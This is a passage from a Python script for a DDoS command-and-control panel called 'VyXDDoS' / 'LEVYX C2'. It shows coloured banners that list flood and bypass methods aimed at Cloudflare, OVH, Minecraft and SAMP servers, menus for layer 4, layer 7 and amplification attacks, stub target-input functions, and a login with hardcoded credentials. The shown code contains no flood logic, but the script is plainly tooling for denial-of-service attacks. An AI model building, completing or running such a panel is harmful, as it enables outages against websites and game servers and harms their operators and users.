\x1b[38;2;0;255;255m        ╔═══                                                       
\x1b[38;2;0;49;147m         •\x1b[38;2;0;255;255m http-raw                \x1b[38;2;0;49;147m  • \x1b[38;2;0;255;255mhttpget                 \x1b[38;2;0;49;147m    •\x1b[38;2;0;255;255m overflow
\x1b[38;2;0;49;147m         •\x1b[38;2;0;255;255m http-socket            \x1b[38;2;0;49;147m   • \x1b[38;2;0;255;255mhttpflood                \x1b[38;2;0;49;147m   •\x1b[38;2;0;255;255m cf-pro     
\x1b[38;2;0;49;147m         •\x1b[38;2;0;255;255m http-requests         \x1b[38;2;0;49;147m    • \x1b[38;2;0;255;255muambypass               \x1b[38;2;0;49;147m    •\x1b[38;2;0;255;255m cf-socket             
\x1b[38;2;0;49;147m         •\x1b[38;2;0;255;255m http-rand            \x1b[38;2;0;49;147m     • \x1b[38;2;0;255;255mcf-bypass             \x1b[38;2;0;49;147m      • \x1b[38;2;0;255;255mhyper        
\x1b[38;2;0;49;147m         •\x1b[38;2;0;255;255m https-spoof            \x1b[38;2;0;49;147m   • \x1b[38;2;0;255;255mcrash                   \x1b[38;2;0;49;147m    •\x1b[38;2;0;255;255m ovh-beam      
          
\x1b[38;2;0;49;147m         •\x1b[38;2;0;255;255m udpbypass              \x1b[38;2;0;49;147m   • \x1b[38;2;0;255;255mtcp                     \x1b[38;2;0;49;147m    • \x1b[38;2;0;255;255mldap                 
\x1b[38;2;0;49;147m         •\x1b[38;2;0;255;255m stdv2                 \x1b[38;2;0;49;147m    • \x1b[38;2;0;255;255movh-raw                   \x1b[38;2;0;49;147m  •\x1b[38;2;0;255;255m std               
\x1b[38;2;0;49;147m         •\x1b[38;2;0;255;255m flux                  \x1b[38;2;0;49;147m    • \x1b[38;2;0;255;255mnfo-killer               \x1b[38;2;0;49;147m   • \x1b[38;2;0;255;255mdestroy            
\x1b[38;2;0;49;147m         •\x1b[38;2;0;255;255m slowloris               \x1b[38;2;0;49;147m  •\x1b[38;2;0;255;255m udp                      \x1b[38;2;0;49;147m   • \x1b[38;2;0;255;255mstress             
\x1b[38;2;0;49;147m         •\x1b[38;2;0;255;255m god                   \x1b[38;2;0;49;147m    • \x1b[38;2;0;255;255mhome                     \x1b[38;2;0;49;147m   •\x1b[38;2;0;255;255m samp
\x1b[38;2;0;49;147m         •\x1b[38;2;0;255;255m ntp                   \x1b[38;2;0;49;147m    • \x1b[38;2;0;255;255movh-amp                   \x1b[38;2;0;49;147m  •\x1b[38;2;0;255;255m minecraft                 ╚════                                                            
                                                       
\x1b[38;2;0;255;255m╚════                                                                        ════╝
  

\x1b[38;2;0;255;255m                          ╔═════════════════════════════╗
\x1b[38;2;0;255;255m                               VVIP METHODS LEVYX C2
\x1b[38;2;0;255;255m                          ╚═════╦══════════════════╦════╝       
╔═══════════════════════════════════════╗  ╔══════════════════════════════════════╗
\x1b[38;2;0;255;255m     Methods <url> <time> <threads>             Methods <url> <time> <threads> 
╚═══════════════════════════════════════╝  ╚══════════════════════════════════════╝                                                   
                                                                             

''')           


def help():
    clear()
    print(f'''
    
    
\x1b[38;2;0;49;147m                       ▄▄▌  ▄▄▄ . ▌ ▐· ▄· ▄▌▐▄• ▄ 
\x1b[38;2;0;49;147m                       ██•  ▀▄.▀·▪█·█▌▐█▪██▌ █▌█▌▪
\x1b[38;2;0;49;147m                       ██▪  ▐▀▀▪▄▐█▐█•▐█▌▐█▪ ·██· 
\x1b[38;2;0;49;147m                       ▐█▌▐▌▐█▄▄▌ ███  ▐█▀·.▪▐█·█▌
\x1b[38;2;0;49;147m                       .▀▀▀  ▀▀▀ . ▀    ▀ • •▀▀ ▀▀
                                      
          \x1b[38;2;0;49;147m╔═════════════════════════════════════════════════════╗
          ║     ║\x1b[38;2;0;212;14mVipMethod \x1b[38;2;0;49;147m► PENGGUNA VVIP 
          ║     ║\x1b[38;2;0;212;14mLAYER7  \x1b[38;2;0;49;147m► SHOW LAYER7 METHODS
          ║     ║\x1b[38;2;0;212;14mLAYER4  \x1b[38;2;0;49;147m► SHOW LAYER4 METHODS
          ║     ║\x1b[38;2;0;212;14mAMP     \x1b[38;2;0;49;147m► SHOW AMP METHODS
          ║     ║\x1b[38;2;0;212;14mSPECIAL \x1b[38;2;0;49;147m► SHOW SPECIAL METHODS
          ║     ║\x1b[38;2;0;212;14mBANNERS \x1b[38;2;0;49;147m► SHOW BANNERS
          ║     ║\x1b[38;2;0;212;14mRULES   \x1b[38;2;0;49;147m► RULES PANEL
          ║     ║\x1b[38;2;0;212;14mPORTS   \x1b[38;2;0;49;147m► SHOW ALL PORTS
          ║     ║\x1b[38;2;0;212;14mTOOLS   \x1b[38;2;0;49;147m► SHOW TOOLS
          ║     ║\x1b[38;2;0;212;14mCLEAR   \x1b[38;2;0;49;147m► CLEAR TERMINAL
\x1b[38;2;0;49;147m          ╚══════════════════════╩══════════════════════════════╝
            ''')

     
                
def get_info_l7():
    clear() 
    target = input()
    thread = input()
    t = input()


def get_info_l4():
    clear() 
    target = input()
    port = input()
    thread = input()
    t = input()                


def login():
    clear()
    user = "444WasHere"
    passwd = "444WasHere"
    username = input("⚡ Username: ")
    password = getpass.getpass(prompt='⚡ Password: ')
    if username != user or password != passwd:
        print("")
        print("⚡ PW SALAH GOBLOK")
        sys.exit(1)
    elif username == user and password == passwd:
        print("⚡ Welcome Bro To VyXDDoS C2")
        time.sleep(0.3)
        main() 

login()





